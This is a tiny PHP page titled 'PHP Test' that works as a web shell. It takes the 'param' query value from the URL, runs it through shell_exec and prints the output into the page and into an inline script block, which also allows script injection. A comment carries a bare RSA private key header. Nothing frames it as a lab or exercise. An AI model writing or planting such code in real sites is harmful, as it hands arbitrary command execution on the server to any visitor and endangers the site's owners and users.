<html>
 <head>
  <title>PHP Test</title>
 </head>
 <body>
    <?php 
        $params = "$_SERVER[REQUEST_URI]";
        // parse_str($url_components['query'], $params); 
        parse_str(parse_url($params)['query'], $params);
        $cmd = $params['param'];
        $result = shell_exec($cmd);
        echo $result;
        echo "<script>console.log('Debug Objects: " . $result . "' );</script>";
        // -----BEGIN RSA PRIVATE KEY-----
    ?>
    
 </body>
</html>